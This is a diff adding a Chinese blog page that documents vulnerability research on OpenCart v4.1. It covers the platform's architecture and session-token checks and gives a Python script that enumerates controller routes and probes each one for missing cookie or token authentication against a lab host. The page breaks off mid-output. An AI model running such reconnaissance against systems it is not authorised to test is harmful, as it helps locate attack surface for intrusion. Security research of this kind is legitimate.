@@ -1,0 +1,881 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/icon.png">
+  <link rel="icon" href="../../../../../img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="noxke">
+  <meta name="keywords" content="Reverse Engineering">
+  
+    <meta name="description" content="Opencart是一个基于PHP的开源电商平台GitHub - opencart&#x2F;opencart: A free shopping cart system. OpenCart is an open source PHP-based online e-commerce solution.  测试版本：国际免费版v4.1  基础运行环境  PHP 8.0+  MySQL 5.7+  Ap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OpenCart漏洞挖掘">
+<meta property="og:url" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.html">
+<meta property="og:site_name" content="NOXKE">
+<meta property="og:description" content="Opencart是一个基于PHP的开源电商平台GitHub - opencart&#x2F;opencart: A free shopping cart system. OpenCart is an open source PHP-based online e-commerce solution.  测试版本：国际免费版v4.1  基础运行环境  PHP 8.0+  MySQL 5.7+  Ap">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/h3Ul3dkN.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/RHENXAyW.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/ezprijf1.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/qb3SeQiT.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/NkmPYek6.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/mcK6g6i4.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/13eDHrfJ.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/CjKmdM9k.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/oByVjRI7.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/Au8e7Lmo.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/FLsSrQCk.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/CzSCFoX5.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/Y6KWEDi4.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/nQqlfUmd.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/Bz3EHld9.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/RDLmGKaj.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/99QDyhGO.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/AO06xG8Y.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/83gD6DoJ.png">
+<meta property="og:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/sQAL68Hl.png">
+<meta property="article:published_time" content="2024-07-03T01:12:46.000Z">
+<meta property="article:modified_time" content="2024-09-13T04:16:27.189Z">
+<meta property="article:author" content="noxke">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.noxke.icu/2024/07/03/ctf_wp/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/h3Ul3dkN.png">
+  
+  
+  
+  <title>OpenCart漏洞挖掘 - NOXKE</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="../../../../../css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.noxke.icu","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="../../../../../index.html">
+      <strong>noxke&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../index.html">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('../../../../../img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="OpenCart漏洞挖掘"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        noxke
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-03 09:12" pubdate>
+          2024年7月3日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          20k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          171 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">OpenCart漏洞挖掘</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>Opencart是一个基于PHP的开源电商平台<a target="_blank" rel="noopener" href="https://github.com/opencart/opencart">GitHub - opencart&#x2F;opencart: A free shopping cart system. OpenCart is an open source PHP-based online e-commerce solution.</a></p>
+</blockquote>
+<p>测试版本：国际免费版v4.1</p>
+<ul>
+<li><p>基础运行环境</p>
+<ol>
+<li><p>PHP 8.0+</p>
+</li>
+<li><p>MySQL 5.7+</p>
+</li>
+<li><p>Apache 2.4 or Nginx1.15+</p>
+</li>
+</ol>
+</li>
+<li><p>组件信息</p>
+<ol>
+<li><p>AWS</p>
+</li>
+<li><p>guzzlehttp</p>
+<ul>
+<li><p>guzzle 7.8.1</p>
+</li>
+<li><p>promises 2.0.2</p>
+</li>
+<li><p>psr7</p>
+</li>
+</ul>
+</li>
+<li><p>mtdowling</p>
+<ul>
+<li>jmespath.php 2.7.0</li>
+</ul>
+</li>
+<li><p>psr</p>
+<ul>
+<li><p>http-client 1.0.3</p>
+</li>
+<li><p>http-factory</p>
+</li>
+<li><p>http-message 1.0.1</p>
+</li>
+</ul>
+</li>
+<li><p>ralouphie&#x2F;getallheaders</p>
+</li>
+<li><p>scssphp</p>
+</li>
+<li><p>symfony</p>
+</li>
+<li><p>twig 3.8.0</p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="架构分析"><a href="#架构分析" class="headerlink" title="架构分析"></a>架构分析</h3><p>opencart采用MVC架构</p>
+<p>在framework中根据<code>cookie</code>中的<code>session_id</code>找到当前会话储存的信息（默认在db中）</p>
+<p>根据<code>route</code>参数进入对应的controller执行对应的method（默认为<code>.index</code>）</p>
+<p>在controller中需要进行逻辑操作，如数据库查询时，加载model，调用model中的方法</p>
+<p>页面渲染加载view，使用twig渲染模板</p>
+<p>用户身份由<code>session_id</code>进行识别，需要用户权限的api访问携带参数<code>customer_token</code>，与<code>session</code>中储存的<code>customer_token</code>进行校验</p>
+<p>管理员页面与用户页面情况相似</p>
+<p>管理员除了<code>session_id</code>、<code>user_token</code>以外，还有<code>access</code>与<code>modify</code>权限检查</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/h3Ul3dkN.png" srcset="/img/loading.gif" lazyload alt="h3Ul3dkN"></p>
+<p><a target="_blank" rel="noopener" href="https://gitmind.cn/app/docs/mzxn6hjg">opencart功能模块分析 - GitMind</a></p>
+<p><a target="_blank" rel="noopener" href="https://gitmind.cn/app/docs/mvfwccj9">opencart逻辑漏洞分析 - GitMind</a></p>
+<h3 id="常见平台漏洞测试"><a href="#常见平台漏洞测试" class="headerlink" title="常见平台漏洞测试"></a>常见平台漏洞测试</h3><ul>
+<li><p>sql注入</p>
+<p>所有的sql查询都对用户输入进行了转换，字符串使用<code>real_escape_string</code>过滤，不太能注</p>
+</li>
+<li><p>模板注入</p>
+<p>twig模板文件渲染成php脚本，代码注入无效</p>
+</li>
+</ul>
+<h3 id="业务面API"><a href="#业务面API" class="headerlink" title="业务面API"></a>业务面API</h3><h4 id="未认证接口分析"><a href="#未认证接口分析" class="headerlink" title="未认证接口分析"></a>未认证接口分析</h4><p>使用脚本扫描业务面API，测试cookie与token是否需要，对不需要cookie与token的API进行重点分析</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>controller_path = <span class="hljs-string">&quot;./deploy/upload/catalog/controller&quot;</span><br><br>base_url = <span class="hljs-string">&quot;http://172.23.9.22:8080/index.php?route=&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie_token</span>():<br>    cookies = &#123;&#125;<br>    token = <span class="hljs-string">&quot;&quot;</span><br>    req_url = base_url + <span class="hljs-string">&quot;account/login.index&quot;</span><br>    response = requests.get(url=req_url)<br><br>    cookie = response.headers[<span class="hljs-string">&quot;Set-Cookie&quot;</span>].split(<span class="hljs-string">&quot;; &quot;</span>)[<span class="hljs-number">0</span>]<br>    cookies[cookie.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">0</span>]] = cookie.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]<br><br>    re_pattren = <span class="hljs-string">r&quot;login_token=([0-9a-f]&#123;26&#125;)&quot;</span><br>    token = re.findall(re_pattren, response.text)[<span class="hljs-number">0</span>]<br><br>    req_url = base_url + <span class="hljs-string">&quot;account/login.login&quot;</span> + <span class="hljs-string">&quot;&amp;login_token=&quot;</span> + token<br>    data = &#123;<br>        <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;test1@123.com&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test1&quot;</span>,<br>    &#125;<br>    response = requests.post(url=req_url, data=data, cookies=cookies)<br><br>    cookie = response.headers[<span class="hljs-string">&quot;Set-Cookie&quot;</span>].split(<span class="hljs-string">&quot;; &quot;</span>)[<span class="hljs-number">0</span>]<br>    cookies[cookie.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">0</span>]] = cookie.split(<span class="hljs-string">&quot;=&quot;</span>)[<span class="hljs-number">1</span>]<br><br>    re_pattren = <span class="hljs-string">r&quot;customer_token=([0-9a-f]&#123;26&#125;)&quot;</span><br>    token = re.findall(re_pattren, response.text)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">return</span> (cookies, token)<br><br>php_files = []<br><br>dirs = [controller_path]<br><span class="hljs-keyword">while</span> (<span class="hljs-built_in">len</span>(dirs) != <span class="hljs-number">0</span>):<br>    cur_dir = dirs.pop(<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> os.listdir(cur_dir):<br>        next_path = cur_dir + <span class="hljs-string">&quot;/&quot;</span> + d<br>        <span class="hljs-keyword">if</span> (os.path.isdir(next_path)):<br>            dirs.append(next_path)<br>        <span class="hljs-keyword">elif</span> (os.path.isfile(next_path) <span class="hljs-keyword">and</span> next_path.endswith(<span class="hljs-string">&quot;.php&quot;</span>)):<br>            php_files.append(next_path)<br>php_files.sort()<br><br>apis = &#123;&#125;<br><span class="hljs-keyword">for</span> php <span class="hljs-keyword">in</span> php_files:<br>    route = php.split(controller_path+<span class="hljs-string">&quot;/&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;.php&quot;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(php, <span class="hljs-string">&quot;rt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        php_content = f.read()<br>    re_pattren = <span class="hljs-string">r&quot;public function ([a-zA-Z][a-zA-Z0-9_\-]*)\(\): void &#123;&quot;</span><br>    methods = []<br>    <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> re.findall(re_pattren, php_content):<br>        methods.append(route + <span class="hljs-string">&quot;.&quot;</span> + method)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(methods) != <span class="hljs-number">0</span>):<br>        apis[route] = methods<br><br><br>cookies, customer_token = get_cookie_token()<br><br><span class="hljs-comment"># 通过是否重定向判断是否需要登录授权</span><br>apis_auth = &#123;&#125;<br><span class="hljs-keyword">for</span> route, methods <span class="hljs-keyword">in</span> apis.items():<br>    <span class="hljs-keyword">if</span> (route <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;account/login&quot;</span>, <span class="hljs-string">&quot;account/logout&quot;</span>]):<br>        <span class="hljs-keyword">continue</span><br>    methods_auth = []<br>    <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:<br>        method_auth = &#123;<span class="hljs-string">&quot;method&quot;</span>: method, <span class="hljs-string">&quot;cookie&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-literal">True</span>&#125;<br>        <span class="hljs-comment"># 带cookie 带token</span><br>        req_url = base_url + method + <span class="hljs-string">&quot;&amp;customer_token=&quot;</span> + customer_token<br>        response = requests.get(req_url, cookies=cookies, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;route=account/login&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(response.headers)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text)):<br>            method_auth[<span class="hljs-string">&quot;cookie&quot;</span>] = <span class="hljs-literal">True</span><br>            method_auth[<span class="hljs-string">&quot;token&quot;</span>] = <span class="hljs-literal">True</span><br>        <span class="hljs-comment"># 带cookie 不带token</span><br>        req_url = base_url + method<br>        response = requests.get(req_url, cookies=cookies, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;route=account/login&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(response.headers)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text)):<br>            method_auth[<span class="hljs-string">&quot;cookie&quot;</span>] = <span class="hljs-literal">True</span><br>            method_auth[<span class="hljs-string">&quot;token&quot;</span>] = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># 不带cookie 带token</span><br>        req_url = base_url + method + <span class="hljs-string">&quot;&amp;customer_token=&quot;</span> + customer_token<br>        response = requests.get(req_url, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;route=account/login&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(response.headers)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text)):<br>            method_auth[<span class="hljs-string">&quot;cookie&quot;</span>] = <span class="hljs-literal">False</span><br>            method_auth[<span class="hljs-string">&quot;token&quot;</span>] = <span class="hljs-literal">True</span><br>        <span class="hljs-comment"># 不带cookie 不带token</span><br>        req_url = base_url + method<br>        response = requests.get(req_url, allow_redirects=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-string">&quot;route=account/login&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(response.headers)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response.text)):<br>            method_auth[<span class="hljs-string">&quot;cookie&quot;</span>] = <span class="hljs-literal">False</span><br>            method_auth[<span class="hljs-string">&quot;token&quot;</span>] = <span class="hljs-literal">False</span><br>        <span class="hljs-comment"># print(method_auth)</span><br>        methods_auth.append(method_auth)<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(methods_auth) != <span class="hljs-number">0</span>):<br>        apis_auth[route] = methods_auth<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;method,cookie,token&quot;</span>)<br><span class="hljs-keyword">for</span> route, methods <span class="hljs-keyword">in</span> apis_auth.items():<br>    <span class="hljs-keyword">for</span> method <span class="hljs-keyword">in</span> methods:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;method[<span class="hljs-string">&quot;method&quot;</span>]&#125;</span>,<span class="hljs-subst">&#123;method[<span class="hljs-string">&quot;cookie&quot;</span>]&#125;</span>,<span class="hljs-subst">&#123;method[<span class="hljs-string">&quot;token&quot;</span>]&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span 